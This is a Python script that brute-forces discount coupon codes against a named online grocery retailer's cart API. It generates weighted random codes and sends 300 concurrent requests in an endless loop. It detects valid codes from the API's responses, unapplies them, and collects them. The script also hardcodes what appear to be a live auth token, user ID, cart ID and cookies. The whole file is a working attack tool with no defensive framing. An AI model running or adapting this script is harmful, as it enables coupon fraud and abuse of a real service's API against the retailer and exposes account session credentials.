import asyncio
import aiohttp
import random
import string
import signal
import sys

apply_url = "https://www.jiomart.com/mst/rest/v1/5/cart/apply_coupon"
unapply_url = "https://www.jiomart.com/mst/rest/v1/5/cart/unapply_coupon?coupon_code=####&cart_id=649840207"
get_current_coupon_url = "https://www.jiomart.com/mst/rest/v1/5/cart/get"

headers = {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-US,en;q=0.9",
    "authtoken": "5fc30d4eb2d37d3e0f55761870c1f41a5d2187d6-1371501393",
    "pin": "560068",
    "priority": "u=1, i",
    "referer": "https://www.jiomart.com/checkout/cart",
    "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Linux"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "userid": "81712781"
}
cookies = {
    "_ALGOLIA": "anonymous-36e8f295-7e97-4b81-9cad-e559793f81a0",
    "new_customer": "false",
    "ajs_anonymous_id": "2f0b9a55-8526-4e6d-ade1-89891a30ea79",
    "nms_mgo_pincode": "560068",
    "nms_mgo_city": "Bangalore",
    "nms_mgo_state_code": "KA"
}

# ----------------------------
# Weighted generator
# ----------------------------

digit_weights = {
    '1': 0.10, '2': 0.12, '3': 0.09, '4': 0.11,
    '5': 0.18, '6': 0.15, '7': 0.08, '8': 0.10, '9': 0.07
}
letter_weights = {
    'U': 0.12, 'S': 0.10, 'M': 0.08, 'I': 0.08,
    'R': 0.08, 'V': 0.07, 'Z': 0.07, 'X': 0.06, 'T': 0.05
}
for l in string.ascii_uppercase:
    if l not in letter_weights:
        letter_weights[l] = 0.01

def weighted_choice(weights):
    items = list(weights.keys())
    probs = list(weights.values())
    return random.choices(items, probs, k=1)[0]

def generate_weighted_code():
    return ''.join(
        weighted_choice(digit_weights) if i % 2 == 0 else weighted_choice(letter_weights)
        for i in range(10)
    )

# ----------------------------
# Networking logic
# ----------------------------

async def calling_rest_generic(session, params, url):
    try:
        async with session.get(url, headers=headers, cookies=cookies, params=params) as resp:
            return await resp.json()
    except Exception as e:
        return {"error": str(e)}

async def calling_rest(session, code, stats, valid_codes):
    params = {"coupon_code": code, "cart_id": "649840207"}
    data = await calling_rest_generic(session, params, apply_url)
    print(data)
    async with stats["lock"]:
        stats["total"] += 1

    if data and data.get("reason") and data["reason"].get("reason_code") != "MAX_LIMIT_BREACH":
        async with stats["lock"]:
            stats["failed"] += 1
    else:
        data_valid = await calling_rest_generic(session, params, get_current_coupon_url)
        valid_code = None
        if data_valid and "result" in data_valid:
            valid_code = data_valid["result"]["cart"]["applied_coupons"]
            await calling_rest_generic(session, params, unapply_url.replace("####", valid_code))

        if valid_code:
            async with stats["lock"]:
                stats["success"] += 1
                valid_codes.add(valid_code)
                # ✅ print immediately when found
                print(f"\n[+] VALID CODE FOUND: {valid_code}")

# ----------------------------
# Main runner (infinite loop)
# ----------------------------

async def main(valid_codes):
    concurrency = 300
    stats = {"total": 0, "failed": 0, "success": 0, "lock": asyncio.Lock()}

    connector = aiohttp.TCPConnector(limit=concurrency)
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:  # run until Ctrl+C
            tasks = [calling_rest(session, generate_weighted_code(), stats, valid_codes) for _ in range(concurrency)]
            await asyncio.gather(*tasks)

            # print progress summary on the same line
            async with stats["lock"]:
                total = stats["total"]
                failed = stats["failed"]
                success = stats["success"]
            ratio = (success / total * 100) if total > 0 else 0
            print(f"\rProgress: Tried={total}, Success={success}, Failed={failed}, HitRate={ratio:.2f}%", end="", flush=True)

# ----------------------------
# Graceful exit on Ctrl+C
# ----------------------------

def shutdown(valid_codes):
    print("\n\n[!] Stopping gracefully...")
    if valid_codes:
        print("\n✅ All Valid Codes Found:")
        for c in valid_codes:
            print("   ", c)
    else:
        print("No valid codes found this session.")
    sys.exit(0)

if __name__ == "__main__":
    valid_codes_global = set()

    def handler(sig, frame):
        shutdown(valid_codes_global)

    signal.signal(signal.SIGINT, handler)

    try:
        asyncio.run(main(valid_codes_global))
    except KeyboardInterrupt:
        shutdown(valid_codes_global)

